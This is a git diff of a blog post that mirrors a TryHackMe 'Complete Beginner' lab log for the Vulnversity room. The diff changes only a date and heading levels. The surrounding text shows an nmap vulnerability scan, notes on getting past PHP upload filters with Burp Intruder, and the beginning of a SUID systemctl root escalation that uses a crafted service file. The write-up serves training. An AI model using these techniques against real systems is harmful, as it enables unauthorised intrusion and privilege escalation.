@@ -1,6 +1,6 @@
 ---
 title: 'TryHackMe: Complete Beginner'
-date: 2021-11-03 05:00:00.000000000 Z
+date: 2021-11-03 12:00:00.000000000 Z
 layout: post-external
 original_link: https://cardboard-iguana.com/log/2021-11-03-tryhackme-complete-beginner.html
 author: 100007
@@ -9,8 +9,8 @@ author: 100007
 <h1 id="tryhackme-complete-beginner">TryHackMe: Complete Beginner</h1>
 <p><strong>author:</strong> Nathan Acks<br />
 <strong>date:</strong> 2021-11-03</p>
-<h2 id="vulnversity">Vulnversity</h2>
-<h3 id="reconnaissance">Reconnaissance</h3>
+<h1 id="vulnversity">Vulnversity</h1>
+<h2 id="reconnaissance">Reconnaissance</h2>
 <p>Scanning the machine with:</p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-vv</span> <span class="nt">-oA</span> vulnversity <span class="nt">-A</span> <span class="nt">-sS</span> <span class="nt">--script</span> vuln <span class="se">\</span>
 <span class="nt">-p-</span> 10.10.157.9
@@ -395,7 +395,7 @@ Read data files from: /usr/bin/../share/nmap
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Wed Nov 3 21:20:50 2021 -- 1 IP address (1 host up) scanned in 1547.16 seconds
 </code></pre></div></div>
-<h3 id="compromising-the-webserver">Compromising the Webserver</h3>
+<h2 id="compromising-the-webserver">Compromising the Webserver</h2>
 <p>Common (alternate) PHP extensions:</p>
 <ul>
 <li>.php</li>
@@ -408,7 +408,7 @@ OS and Service detection performed. Please report any incorrect results at https
 <p>Note that when matching a URL against a pattern in FoxyProxy, nonstandard ports <em>must</em> be included! (So, <code class="language-plaintext highlighter-rouge">example.com</code> will pick up traffic on ports 80 and 443, but not port 8080. To do that, use <code class="language-plaintext highlighter-rouge">example.com:8080</code>.)</p>
 <p>Recall that the “Intruder” module in Burp Suite is the one that is used to attack/fuzz web requests.</p>
 <p>One nice trick is that after fuzzing your way around file extension filters, you can just return to the Proxy tab and complete your upload…</p>
-<h3 id="privilege-escalation">Privilege Escalation</h3>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
 <p>It turns out that SUID systemctl doesn’t require sudo to run, which means that you can craft a malicious service file to gain root access:</p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">FILE</span><span class="o">=</span><span class="sb">`</span><span class="nb">mktemp</span> <span class="nt">-u</span><span class="sb">`</span>
 <span class="nb">echo</span> <span class="s2">"[Service]"</span> <span class="o">&gt;&gt;</span> <span class="nv">$FILE</span>.service
